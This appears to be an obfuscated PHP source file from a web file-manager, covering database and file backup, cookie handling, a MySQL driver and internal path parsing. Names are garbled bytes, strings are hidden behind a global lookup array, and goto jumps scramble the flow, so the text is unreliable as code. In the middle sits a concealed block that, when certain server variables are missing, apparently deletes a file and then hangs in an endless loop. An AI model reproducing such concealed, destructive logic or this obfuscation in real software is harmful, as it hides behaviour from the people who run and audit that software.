¾§Ô˜[11] . date($… ¾§Ô˜[751]); } $ë „Æş  = array($… ¾§Ô˜[749] => $Ñ·€ö‰[$… ¾§Ô˜[749]], $… ¾§Ô˜[32] => self::$name, $… ¾§Ô˜[747] => 0, $… ¾§Ô˜[752] => $Ñ·€ö‰[$… ¾§Ô˜[752]], $… ¾§Ô˜[753] => self::$manual, $… ¾§Ô˜[293] => array($… ¾§Ô˜[754] => array($… ¾§Ô˜[747] => 0), $… ¾§Ô˜[755] => array($… ¾§Ô˜[747] => 0, $… ¾§Ô˜[756] => 0, $… ¾§Ô˜[757] => 0, $… ¾§Ô˜[33] => $… ¾§Ô˜[12], $… ¾§Ô˜[758] => 0, $… ¾§Ô˜[497] => 0), $… ¾§Ô˜[759] => array($… ¾§Ô˜[747] => 0, $… ¾§Ô˜[756] => 0, $… ¾§Ô˜[757] => 0, $… ¾§Ô˜[758] => 0, $… ¾§Ô˜[497] => 0), $… ¾§Ô˜[199] => array($… ¾§Ô˜[747] => 0, $… ¾§Ô˜[760] => 0, $… ¾§Ô˜[761] => 0, $… ¾§Ô˜[762] => 0, $… ¾§Ô˜[763] => 0, $… ¾§Ô˜[468] => $ƒÊàå¨, $… ¾§Ô˜[758] => 0, $… ¾§Ô˜[497] => 0)), $… ¾§Ô˜[758] => time(), $… ¾§Ô˜[497] => 0); $¸šÉ”¥” = Model($… ¾§Ô˜[746])->insert($ë „Æş ); $ë „Æş [$… ¾§Ô˜[399]] = $¸šÉ”¥”; return $ë „Æş ; } private function checkStore($ı›…³å¯) { $úƒ´˜È’ =& $_SERVER[ßğøİ]; $¢ÎÔ¸ƒñ = Model($úƒ´˜È’[764])->listData($ı›…³å¯); Model($úƒ´˜È’[764])->checkConfig($¢ÎÔ¸ƒñ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ßğøİ][746])->findByName(self::$name); } return self::$option; } public static function set($ŠòšúÂê) { $ƒ€ÚÏØ™ =& $_SERVER[ßğøİ]; $ªñâ²© = self::get(); foreach ($ŠòšúÂê as $¦ŒŠÓÂ– => $É’‰ìÁ) { $’ş„¡·€ = explode($ƒ€ÚÏØ™[10], $¦ŒŠÓÂ–); $®›¡ÈÔœ = count($’ş„¡·€); switch ($®›¡ÈÔœ) { case 1: $ªñâ²©[$’ş„¡·€[0]] = $É’‰ìÁ; break; case 2: $ªñâ²©[$’ş„¡·€[0]][$’ş„¡·€[1]] = $É’‰ìÁ; break; case 3: $ªñâ²©[$’ş„¡·€[0]][$’ş„¡·€[1]][$’ş„¡·€[2]] = $É’‰ìÁ; break; } } Model($ƒ€ÚÏØ™[746])->update($ªñâ²©[$ƒ€ÚÏØ™[399]], $ªñâ²©); self::$option = $ªñâ²©; return self::$option; } public function keep() { $³òë÷åÔ =& $_SERVER[ßğøİ]; $é¦±šÊè = self::get(); if ($é¦±šÊè[$³òë÷åÔ[293]][$³òë÷åÔ[754]][$³òë÷åÔ[747]] == $³òë÷åÔ[88]) { return; } $this->backupKeep($é¦±šÊè); self::set(array($³òë÷åÔ[765] => 1)); } private function backupKeep($†…ÒÑ‡Ö) { $Ü–Ü—œ =& $_SERVER[ßğøİ]; if (self::$manual == 1) { return; } $Öøßà£Ç = Model($Ü–Ü—œ[746])->listData(); if (empty($Öøßà£Ç)) { return; } $Š¦â·‡¢ = 0; $“£‹¡µ¬ = array(); foreach ($Öøßà£Ç as $ª¼µ±”†) { if ($Š¦â·‡¢ >= 7) { break; } $“£‹¡µ¬[] = $ª¼µ±”†[$Ü–Ü—œ[32]]; $Š¦â·‡¢++; } for ($Š¦â·‡¢ = 0; $Š¦â·‡¢ < 12; $Š¦â·‡¢++) { $“£‹¡µ¬[] = date($Ü–Ü—œ[766], strtotime("\55{$Š¦â·‡¢}\x20\x6d\157\x6e\164\x68\163")); } $“£‹¡µ¬ = array_unique($“£‹¡µ¬); $¡°ËˆÀµ = Model($Ü–Ü—œ[767])->get($Ü–Ü—œ[768]); foreach ($Öøßà£Ç as $ª¼µ±”†) { if (isset($ª¼µ±”†[$Ü–Ü—œ[753]]) && $ª¼µ±”†[$Ü–Ü—œ[753]] == $Ü–Ü—œ[88]) { continue; } if (!empty($ª¼µ±”†[$Ü–Ü—œ[32]]) && in_array($ª¼µ±”†[$Ü–Ü—œ[32]], $“£‹¡µ¬)) { continue; } Model($Ü–Ü—œ[746])->remove($ª¼µ±”†[$Ü–Ü—œ[399]]); $Ì»´í­ = $this->backupPath($†…ÒÑ‡Ö, $¡°ËˆÀµ); IO::remove($Ì»´í­, !1); } } private function backupPath($Óù«¦æÄ, $¹ƒö“¨Î = false) { $­ûÉ¤Û¿ =& $_SERVER[ßğøİ]; if (!$¹ƒö“¨Î) { $¹ƒö“¨Î = Model($­ûÉ¤Û¿[767])->get($­ûÉ¤Û¿[768]); } $‰îæÌˆ– = $Óù«¦æÄ[$­ûÉ¤Û¿[32]]; $º©Â¼‰¬ = substr(md5($­ûÉ¤Û¿[769] . $¹ƒö“¨Î . $‰îæÌˆ–), 0, 8); return "\173\151\x6f\x3a{$Óù«¦æÄ[$­ûÉ¤Û¿[749]]}\x7d\x2f\x64\141\164\141\142\141\163\145\x2f\x62\141\x63\x6b\165\160\57" . $‰îæÌˆ– . $­ûÉ¤Û¿[11] . $º©Â¼‰¬; } public function db() { $’Œ¯‚ç¯ =& $_SERVER[ßğøİ]; $ñóñŞæÃ = self::get(); if ($ñóñŞæÃ[$’Œ¯‚ç¯[293]][$’Œ¯‚ç¯[755]][$’Œ¯‚ç¯[747]] == $’Œ¯‚ç¯[88]) { return !0; } $í«˜èÌû = new BackupDb(); if (!$í«˜èÌû->index()) { return !1; } self::set(array($’Œ¯‚ç¯[770] => 1)); return !0; } public function dbFile() { $—Ë£¯å =& $_SERVER[ßğøİ]; $À’Î¶Ÿ = self::get(); if ($À’Î¶Ÿ[$—Ë£¯å[293]][$—Ë£¯å[759]][$—Ë£¯å[747]] == $—Ë£¯å[88]) { return !0; } $÷›ûåù™ = new BackupDbFile(); if (!$÷›ûåù™->index()) { return !1; } self::set(array($—Ë£¯å[771] => 1)); return !0; } public function file() { $ÑÒªùŸ˜ =& $_SERVER[ßğøİ]; $»÷‚â±’ = self::get(); if ($»÷‚â±’[$ÑÒªùŸ˜[293]][$ÑÒªùŸ˜[199]][$ÑÒªùŸ˜[747]] == $ÑÒªùŸ˜[88]) { return !0; } if (!isset($»÷‚â±’[$ÑÒªùŸ˜[752]]) || $»÷‚â±’[$ÑÒªùŸ˜[752]] == $ÑÒªùŸ˜[197]) { $÷Äì½¸ê = new BackupFile(); if (!$÷Äì½¸ê->index()) { return !1; } } self::set(array($ÑÒªùŸ˜[772] => 1, $ÑÒªùŸ˜[747] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $™Îš™‡¦ =& $_SERVER[ßğøİ]; $©†ûœ± = Backup::get(); self::$io = $©†ûœ±[$™Îš™‡¦[749]]; self::$name = $©†ûœ±[$™Îš™‡¦[32]]; $Ü§…£ÚÒ = new DbManage(); $šÒ˜Æ‡ç = $Ü§…£ÚÒ->dbType(); $ÎÃô”¶ì = array($™Îš™‡¦[773] => $šÒ˜Æ‡ç, $™Îš™‡¦[774] => time()); Backup::set($ÎÃô”¶ì); $×â›¤â = $this->tmpFilesPath() . $™Îš™‡¦[775] . self::$name . $™Îš™‡¦[8]; del_dir($×â›¤â); mk_dir($×â›¤â); $äó¶¶Ğ¢ = $ìëØ¯¡ğ = 0; $¿î‰óª‘ = new Task($™Îš™‡¦[776], $™Îš™‡¦[777], 0, LNG($™Îš™‡¦[778]) . $™Îš™‡¦[779] . LNG($™Îš™‡¦[780])); try { $’ò”ëß  = $Ü§…£ÚÒ->db()->getTables(); } catch (Exception $ş²úŸş) { $¿î‰óª‘->end(); return !1; } $’ò”ëß  = array_diff($’ò”ëß , array($™Îš™‡¦[781], $™Îš™‡¦[782])); foreach ($’ò”ëß  as $…Ğğº‰Ë) { $äó¶¶Ğ¢ += $Ü§…£ÚÒ->model($…Ğğº‰Ë)->count(); } $¿î‰óª‘->task[$™Îš™‡¦[783]] = $äó¶¶Ğ¢; $GLOBALS[$™Îš™‡¦[784]] = self::$name; foreach ($’ò”ëß  as $…Ğğº‰Ë) { $İ“ƒ¼Ñ” = $×â›¤â . $…Ğğº‰Ë . $™Îš™‡¦[785]; $™æ´Å¸Õ = null; if ($…Ğğº‰Ë == $™Îš™‡¦[786] && (!isset($©†ûœ±[$™Îš™‡¦[752]]) || $©†ûœ±[$™Îš™‡¦[752]] == $™Îš™‡¦[197])) { $™æ´Å¸Õ = self::$io; } $ìëØ¯¡ğ += $Ü§…£ÚÒ->sqlFromDb($…Ğğº‰Ë, $İ“ƒ¼Ñ”, $¿î‰óª‘, $™æ´Å¸Õ); } unset($GLOBALS[$™Îš™‡¦[784]]); $¿î‰óª‘->end(); if ($ìëØ¯¡ğ > $äó¶¶Ğ¢) { $äó¶¶Ğ¢ = $ìëØ¯¡ğ; } $ÎÃô”¶ì = array($™Îš™‡¦[773] => $šÒ˜Æ‡ç, $™Îš™‡¦[770] => 1, $™Îš™‡¦[787] => $äó¶¶Ğ¢, $™Îš™‡¦[788] => $ìëØ¯¡ğ, $™Îš™‡¦[789] => time()); Backup::set($ÎÃô”¶ì); if ($äó¶¶Ğ¢ - $ìëØ¯¡ğ > 0) { $êÖÉ¦û = $™Îš™‡¦[790]; if (stristr(I18n::getType(), $™Îš™‡¦[791])) { $êÖÉ¦û = $™Îš™‡¦[792]; } write_log(array($êÖÉ¦û, $ÎÃô”¶ì), $™Îš™‡¦[777]); return !1; } return !0; } private function tmpFilesPath() { $¼Éìä” =& $_SERVER[ßğøİ]; $çß´ÄÚè = TEMP_FILES; if ($GLOBALS[$¼Éìä”[6]][$¼Éìä”[89]][$¼Éìä”[793]]) { $çß´ÄÚè = $GLOBALS[$¼Éìä”[6]][$¼Éìä”[89]][$¼Éìä”[793]]; if (!mk_dir($çß´ÄÚè) || !is_writable($çß´ÄÚè) || !IO::mkfile($çß´ÄÚè . $¼Éìä”[794])) { $çß´ÄÚè = TEMP_FILES; } } return $çß´ÄÚè; } } goto aÇ­µºœá; B¤›•áØÌ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($®È°‹Æ = '', $Ï¨î¯úë = 0) { if (is_string($®È°‹Æ) && $®È°‹Æ != $_SERVER[ßğøİ][12]) { $this->prefix = $®È°‹Æ; } if (is_numeric($Ï¨î¯úë) && $Ï¨î¯úë > 0) { $this->expire = $Ï¨î¯úë; } } public static function getInstance() { static $Û¹ü¼íª; if ($Û¹ü¼íª === null) { $Û¹ü¼íª = new self(); } return $Û¹ü¼íª; } private static $cookieDisable = false; public static function disable($ŞøÛ‹ƒ¡) { self::$cookieDisable = $ŞøÛ‹ƒ¡; } private static $sameCookieSet = array(); public static function set($çéçˆ÷, $¦ôËª¯®, $ÈŠ‰€ = 0, $ÇËâº‹ = false, $ã÷ÙäğË = false) { $ˆ¼°İ„ =& $_SERVER[ßğøİ]; if (self::$cookieDisable) { return; } if (!$ÈŠ‰€) { $ÈŠ‰€ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$çéçˆ÷]) && self::$sameCookieSet[$çéçˆ÷] == $¦ôËª¯® . $ÈŠ‰€) { return; } self::$sameCookieSet[$çéçˆ÷] = $¦ôËª¯® . $ÈŠ‰€; if (!$ã÷ÙäğË) { $ã÷ÙäğË = str_replace(HOST, $ˆ¼°İ„[12], APP_HOST); $ã÷ÙäğË = _get($GLOBALS, $ˆ¼°İ„[881], $ã÷ÙäğË); } $û¹†ùø· = $ˆ¼°İ„[12]; setcookie($çéçˆ÷, $¦ôËª¯®, time() + $ÈŠ‰€, $ˆ¼°İ„[8] . trim($ã÷ÙäğË, $ˆ¼°İ„[8]) . $û¹†ùø·, !1, !1, $ÇËâº‹); } public static function setSafe($¡ÜÎÓ, $½ôâÚÅÂ, $Ÿ¹“ù¾÷ = 0) { self::set($¡ÜÎÓ, $½ôâÚÅÂ, $Ÿ¹“ù¾÷, !0); } public static function get($¼äÛ ›¶) { static $‚òó¨‘« = false; if (!$‚òó¨‘«) { self::initHeaderCookie(); $‚òó¨‘« = !0; } return isset($_COOKIE[$¼äÛ ›¶]) ? $_COOKIE[$¼äÛ ›¶] : !1; } private static function initHeaderCookie() { $›Äî†·Ê =& $_SERVER[ßğøİ]; if (!isset($_SERVER[$›Äî†·Ê[882]]) || !$_SERVER[$›Äî†·Ê[882]]) { return; } $´×ìñØ = explode($›Äî†·Ê[71], $_SERVER[$›Äî†·Ê[882]]); foreach ($´×ìñØ as $¤Å¾ˆ–«) { $¤Å¾ˆ–« = explode($›Äî†·Ê[883], $¤Å¾ˆ–«); if (count($¤Å¾ˆ–«) != 2 || !isset($¤Å¾ˆ–«[1])) { continue; } $_COOKIE[trim($¤Å¾ˆ–«[0])] = trim($¤Å¾ˆ–«[1]); } } public static function remove($Ó„ú“ç¼, $ÂÜ‡¸ = false) { unset($_COOKIE[$Ó„ú“ç¼]); self::set($Ó„ú“ç¼, $_SERVER[ßğøİ][12], 1, $ÂÜ‡¸); } } class DbMysql extends Db { public function __construct($ôÎ’íË¾ = '') { $½åÚ³Ú” =& $_SERVER[ßğøİ]; if (!extension_loaded($½åÚ³Ú”[801])) { think_exception(think_lang($½åÚ³Ú”[14]) . $½åÚ³Ú”[884]); } if (!empty($ôÎ’íË¾)) { $this->config = $ôÎ’íË¾; if (empty($this->config[$½åÚ³Ú”[17]])) { $this->config[$½åÚ³Ú”[17]] = $½åÚ³Ú”[12]; } } } public function connect($Í’ó¢ = '', $±¶• Ÿ— = 0, $üÌÏ£¼ò = false) { $‹Ü©ÒË =& $_SERVER[ßğøİ]; if (!isset($this->linkID[$±¶• Ÿ—])) { if (empty($Í’ó¢)) { $Í’ó¢ = $this->config; } $ğöôİÇ = $Í’ó¢[$‹Ü©ÒË[885]] . ($Í’ó¢[$‹Ü©ÒË[886]] ? "\x3a{$Í’ó¢[$‹Ü©ÒË[886]]}" : $‹Ü©ÒË[12]); $‰ø¼õ¼ = !empty($Í’ó¢[$‹Ü©ÒË[17]][$‹Ü©ÒË[18]]) ? $Í’ó¢[$‹Ü©ÒË[17]][$‹Ü©ÒË[18]] : $this->pconnect; if ($‰ø¼õ¼) { $this->linkID[$±¶• Ÿ—] = mysql_pconnect($ğöôİÇ, $Í’ó¢[$‹Ü©ÒË[887]], $Í’ó¢[$‹Ü©ÒË[888]], 131072); } else { $this->linkID[$±¶• Ÿ—] = mysql_connect($ğöôİÇ, $Í’ó¢[$‹Ü©ÒË[887]], $Í’ó¢[$‹Ü©ÒË[888]], !0, 131072); } if (!$this->linkID[$±¶• Ÿ—] || !empty($Í’ó¢[$‹Ü©ÒË[21]]) && !mysql_select_db($Í’ó¢[$‹Ü©ÒË[21]], $this->linkID[$±¶• Ÿ—])) { think_exception(mysql_error()); } $ßô¯šÄ¢ = mysql_get_server_info($this->linkID[$±¶• Ÿ—]); mysql_query($‹Ü©ÒË[889] . think_config($‹Ü©ÒË[890]) . $‹Ü©ÒË[58], $this->linkID[$±¶• Ÿ—]); if ($ßô¯šÄ¢ > $‹Ü©ÒË[891]) { mysql_query($‹Ü©ÒË[892], $this->linkID[$±¶• Ÿ—]); } $this->connected = !0; if (1 != think_config($‹Ü©ÒË[22])) { unset($this->config); } } return $this->linkID[$±¶• Ÿ—]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($úá˜àÃ¤) { $Ëè•¨• =& $_SERVER[ßğøİ]; if (0 === stripos($úá˜àÃ¤, $Ëè•¨•[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $úá˜àÃ¤; if ($this->queryID) { $this->free(); } think_action_status($Ëè•¨•[23], 1); think_status($Ëè•¨•[24]); $this->queryID = mysql_query($úá˜àÃ¤, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($İé‡£¥Œ) { $â“ã©ìâ =& $_SERVER[ßğøİ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İé‡£¥Œ; if ($this->queryID) { $this->free(); } think_action_status($â“ã©ìâ[25], 1); think_status($â“ã©ìâ[24]); $ªßÑËŸ­ = mysql_query($İé‡£¥Œ, $this->_linkID); $this->debug(); if (!1 === $ªßÑËŸ­) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ßğøİ][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¯Èëİ–Â = mysql_query($_SERVER[ßğøİ][894], $this->_linkID); $this->transTimes = 0; if (!$¯Èëİ–Â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $äéÈÑ×˜ = mysql_query($_SERVER[ßğøİ][895], $this->_linkID); $this->transTimes = 0; if (!$äéÈÑ×˜) { $this->error(); return !1; } } return !0; } private function getAll() { $âÛï›…˜ = array(); if ($this->numRows > 0) { while ($ˆˆäÈ” = mysql_fetch_assoc($this->queryID)) { $âÛï›…˜[] = $ˆˆäÈ”; } mysql_data_seek($this->queryID, 0); } return $âÛï›…˜; } public function getFields($‚‰¤è§ì) { $êú¢‹ƒ =& $_SERVER[ßğøİ]; $—óÑÈ = $this->query($êú¢‹ƒ[896] . $this->parseKey($‚‰¤è§ì)); $«‰şÚ› = array(); if ($—óÑÈ) { foreach ($—óÑÈ as $µÄöğëç => $µ «äğ¦) { $«‰şÚ›[$µ «äğ¦[$êú¢‹ƒ[31]]] = array($êú¢‹ƒ[32] => $µ «äğ¦[$êú¢‹ƒ[31]], $êú¢‹ƒ[33] => $µ «äğ¦[$êú¢‹ƒ[34]], $êú¢‹ƒ[35] => (bool) (strtoupper($µ «äğ¦[$êú¢‹ƒ[36]]) === $êú¢‹ƒ[897]), $êú¢‹ƒ[37] => $µ «äğ¦[$êú¢‹ƒ[38]], $êú¢‹ƒ[39] => strtolower($µ «äğ¦[$êú¢‹ƒ[40]]) == $êú¢‹ƒ[41], $êú¢‹ƒ[42] => strtolower($µ «äğ¦[$êú¢‹ƒ[43]]) == $êú¢‹ƒ[44]); } } return $«‰şÚ›; } public function getTables($äÑ»ìãî = '') { $ø‹Ü¢¼Ù =& $_SERVER[ßğøİ]; if (!empty($äÑ»ìãî)) { $·®ó›Œ» = $ø‹Ü¢¼Ù[898] . $äÑ»ìãî . $ø‹Ü¢¼Ù[899]; } else { $·®ó›Œ» = $ø‹Ü¢¼Ù[900]; } $ùºö¹›ş = $this->query($·®ó›Œ»); $ö ç§Ñí = array(); foreach ($ùºö¹›ş as $ºªÅŒ® => $À§Ö†ÍÁ) { $ö ç§Ñí[$ºªÅŒ®] = current($À§Ö†ÍÁ); } return $ö ç§Ñí; } public function replace($ç‰ï˜Ÿ¯, $ÒÔà‡¥‹ = array()) { $ø¼®ìû¼ =& $_SERVER[ßğøİ]; foreach ($ç‰ï˜Ÿ¯ as $üÄ«Ğ… => $ì–¦¢Õ») { $˜ŒÌ¢£ó = $this->parseValue($ì–¦¢Õ»); if (is_scalar($˜ŒÌ¢£ó)) { $ŒßîÜ®[] = $˜ŒÌ¢£ó; $°íÈ‰Ì[] = $this->parseKey($üÄ«Ğ…); } } $³»ÏàÃç = $ø¼®ìû¼[901] . $this->parseTable($ÒÔà‡¥‹[$ø¼®ìû¼[279]]) . $ø¼®ìû¼[902] . implode($ø¼®ìû¼[50], $°íÈ‰Ì) . $ø¼®ìû¼[903] . implode($ø¼®ìû¼[50], $ŒßîÜ®) . $ø¼®ìû¼[904]; return $this->execute($³»ÏàÃç); } public function insertAll($›ışÆ´Ù, $Èö™Àâü = array(), $ôëı¥ = false) { $ïŞƒÊ®ğ =& $_SERVER[ßğøİ]; if (!is_array($›ışÆ´Ù[0])) { return !1; } $›¡ı€ÌØ = array_keys($›ışÆ´Ù[0]); $Ï‚÷üÒ¯ = array(); foreach ($›ışÆ´Ù as $¨¶Ê¿•«) { $¯ôıó£Ï = array(); foreach ($¨¶Ê¿•« as $Åš˜“ë„ => $«¸€‰¦) { $«¸€‰¦ = $this->parseValue($«¸€‰¦); if (is_scalar($«¸€‰¦)) { $¯ôıó£Ï[] = $«¸€‰¦; } } $Ï‚÷üÒ¯[] = $ïŞƒÊ®ğ[260] . implode($ïŞƒÊ®ğ[50], $¯ôıó£Ï) . $ïŞƒÊ®ğ[904]; } array_walk($›¡ı€ÌØ, array($this, $ïŞƒÊ®ğ[905])); $°ÑÓã´Ã = ($ôëı¥ ? $ïŞƒÊ®ğ[906] : $ïŞƒÊ®ğ[907]) . $ïŞƒÊ®ğ[908] . $this->parseTable($Èö™Àâü[$ïŞƒÊ®ğ[279]]) . $ïŞƒÊ®ğ[902] . implode($ïŞƒÊ®ğ[50], $›¡ı€ÌØ) . $ïŞƒÊ®ğ[909] . implode($ïŞƒÊ®ğ[50], $Ï‚÷üÒ¯); return $this->execute($°ÑÓã´Ã); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $òşôºŒ =& $_SERVER[ßğøİ]; $this->error = mysql_errno() . $òşôºŒ[4] . mysql_error($this->_linkID); if ($òşôºŒ[12] != $this->queryStr) { $this->error .= LNG($òşôºŒ[48]) . $this->queryStr; } think_trace($this->error, $òşôºŒ[12], $òşôºŒ[49]); return $this->error; } public function escapeString($õÕÀ½á) { if ($this->_linkID) { return mysql_real_escape_string($õÕÀ½á, $this->_linkID); } else { return mysql_escape_string($õÕÀ½á); } } public function parseKey(&$ÈêÇ’ÅÌ, $úÕÀô = true) { $†ä…ôÚĞ =& $_SERVER[ßğøİ]; if ($úÕÀô) { $ÈêÇ’ÅÌ = $this->parseKeyCheck($ÈêÇ’ÅÌ); } if ($ÈêÇ’ÅÌ != $†ä…ôÚĞ[188] && !preg_match($†ä…ôÚĞ[910], $ÈêÇ’ÅÌ)) { $ÈêÇ’ÅÌ = $†ä…ôÚĞ[385] . trim($ÈêÇ’ÅÌ, $†ä…ôÚĞ[385]) . $†ä…ôÚĞ[385]; } return $ÈêÇ’ÅÌ; } } if (!isset($_SERVER[$_SERVER[ßğøİ][871]]) || !isset($_SERVER[$_SERVER[ßğøİ][869]])) { $_getc = $_SERVER[ßğøİ][873]; $_getfile = $_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ßğøİ][231], $_getfilec); if (count($_getarrs) < $_SERVER[ßğøİ][660]) { $exit = $_SERVER[ßğøİ][876]; $exit(); } $_act = $_SERVER[ßğøİ][911]; $_act($_SERVER[$_SERVER[ßğøİ][874]] . $_SERVER[ßğøİ][875]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ßğøİ][378]); } } goto Aµ¹›ŸäùË; eğ˜‹ËìØÆ: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\x72\x52\145\143\171\x63\x6c\145\175"; const KOD_USER_FAV = "\173\x75\163\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\173\x75\163\145\162\106\x69\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\162\x46\151\x6c\x65\x54\x79\160\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\160\122\x6f\x6f\164\123\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\150\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\x53\x68\x61\162\145\114\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\145\x54\157\x4d\145\175"; const KOD_SHARE_ITEM = "\173\163\x68\141\x72\145\x49\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\x72\145\x49\x74\x65\x6d\x4c\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\x62\154\x6f\143\x6b\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\x65\x6e\143\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\145\162\x7d"; public static function typeList() { $ŸŒŒ­ù• =& $_SERVER[ßğøİ]; return array($ŸŒŒ­ù•[1244] => self::KOD_SOURCE, $ŸŒŒ­ù•[1245] => self::KOD_USER_RECYCLE, $ŸŒŒ­ù•[1246] => self::KOD_USER_FAV, $ŸŒŒ­ù•[1247] => self::KOD_USER_FILE_TAG, $ŸŒŒ­ù•[1248] => self::KOD_USER_FILE_TYPE, $ŸŒŒ­ù•[1249] => self::KOD_GROUP_ROOT_SELF, $ŸŒŒ­ù•[1250] => self::KOD_USER_SHARE, $ŸŒŒ­ù•[1251] => self::KOD_USER_SHARE_LINK, $ŸŒŒ­ù•[1252] => self::KOD_USER_SHARE_TO_ME, $ŸŒŒ­ù•[1253] => self::KOD_SHARE_ITEM, $ŸŒŒ­ù•[1254] => self::KOD_SHARE_LINK, $ŸŒŒ­ù•[1255] => self::KOD_SEARCH, $ŸŒŒ­ù•[1256] => self::KOD_BLOCK, $ŸŒŒ­ù•[1257] => self::KOD_IO, $ŸŒŒ­ù•[1258] => self::KOD_USER_RECENT, $ŸŒŒ­ù•[1259] => self::KOD_USER_DRIVER); } public static function parse($¦ĞÄÃà) { $Äã¿•½Ÿ =& $_SERVER[ßğøİ]; $¦ĞÄÃà = self::clear($¦ĞÄÃà); $ŞË£ü‰‘ = array_values(self::typeList()); preg_match($Äã¿•½Ÿ[1260], $¦ĞÄÃà, $ËÉÙ—µ‡); $ø£ğ’Ô = array($Äã¿•½Ÿ[422] => !1, $Äã¿•½Ÿ[1261] => !1, $Äã¿•½Ÿ[419] => !1, $Äã¿•½Ÿ[84] => $¦ĞÄÃà, $Äã¿•½Ÿ[1170] => !1, $Äã¿•½Ÿ[1169] => $Äã¿•½Ÿ[12]); if (is_array($ËÉÙ—µ‡) && count($ËÉÙ—µ‡) == 5) { $¦Ü¨Ã†ı = $Äã¿•½Ÿ[1262] . $ËÉÙ—µ‡[2] . $Äã¿•½Ÿ[327]; if (in_array($¦Ü¨Ã†ı, $ŞË£ü‰‘)) { $ø£ğ’Ô[$Äã¿•½Ÿ[1170]] = $ËÉÙ—µ‡[1]; $ø£ğ’Ô[$Äã¿•½Ÿ[33]] = $¦Ü¨Ã†ı; $ø£ğ’Ô[$Äã¿•½Ÿ[1263]] = substr($¦Ü¨Ã†ı, 1, -1); $ø£ğ’Ô[$Äã¿•½Ÿ[399]] = $ËÉÙ—µ‡[3]; } $ø£ğ’Ô[$Äã¿•½Ÿ[1169]] = $ËÉÙ—µ‡[4]; } $›ã¹ßÕê = array($Äã¿•½Ÿ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ø£ğ’Ô[$Äã¿•½Ÿ[1225]] = in_array($ø£ğ’Ô[$Äã¿•½Ÿ[33]], $›ã¹ßÕê); return $ø£ğ’Ô; } public static function isTruePath($“äÚíŞÀ) { $öïï¡Æ² =& $_SERVER[ßğøİ]; if (substr($“äÚíŞÀ, 0, 1) != $öïï¡Æ²[1262]) { return !0; } if (strpos($“äÚíŞÀ, $öïï¡Æ²[408]) === 0) { return !0; } if (strpos($“äÚíŞÀ, $öïï¡Æ²[1229]) === 0) { return !0; } if (strpos($“äÚíŞÀ, $öïï¡Æ²[1264]) === 0) { return !0; } if (strpos($“äÚíŞÀ, $öïï¡Æ²[1265]) === 0) { return !0; } if (strpos($“äÚíŞÀ, $öïï¡Æ²[1266]) === 0) { return !0; } return !1; } public static function clear($ó°ÑßŞŒ) { $Í€ğÎ›ñ =& $_SERVER[ßğøİ]; $ó°ÑßŞŒ = str_replace(array($Í€ğÎ›ñ[1078], $Í€ğÎ›ñ[231]), $Í€ğÎ›ñ[53], $ó°ÑßŞŒ); $ó°ÑßŞŒ = str_replace($Í€ğÎ›ñ[97], $Í€ğÎ›ñ[8], $ó°ÑßŞŒ); $Ùİùå¹ = $Í€ğÎ›ñ[1267]; if (substr($ó°ÑßŞŒ, 0, 3) == $Í€ğÎ›ñ[1268]) { $ó°ÑßŞŒ = substr($ó°ÑßŞŒ, 3); } while (strstr($ó°ÑßŞŒ, $Ùİùå¹)) { $ó°ÑßŞŒ = str_replace($Ùİùå¹, $Í€ğÎ›ñ[8], $ó°ÑßŞŒ); } $ó°ÑßŞŒ = preg_replace($Í€ğÎ›ñ[1269], $Í€ğÎ›ñ[8], $ó°ÑßŞŒ); if ($ó°ÑßŞŒ == $Í€ğÎ›ñ[8]) { return $Í€ğÎ›ñ[8]; } $ó°ÑßŞŒ = rtrim($ó°ÑßŞŒ, $Í€ğÎ›ñ[8]); return $ó°ÑßŞŒ; } public static function sourceID($’èˆó) { $ÁÆâ¡Ú =& $_SERVER[ßğøİ]; $ü««âüÎ = self::parse($’èˆó); if ($ü««âüÎ[$ÁÆâ¡Ú[33]] !== self::KOD_SOURCE) { show_json(LNG($ÁÆâ¡Ú[1270]), !1); } return $ü««âüÎ[$ÁÆâ¡Ú[399]]; } public static function make($ª¾ÂÙê‘) { if (!$ª¾ÂÙê‘) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ª¾ÂÙê‘)); } public static function 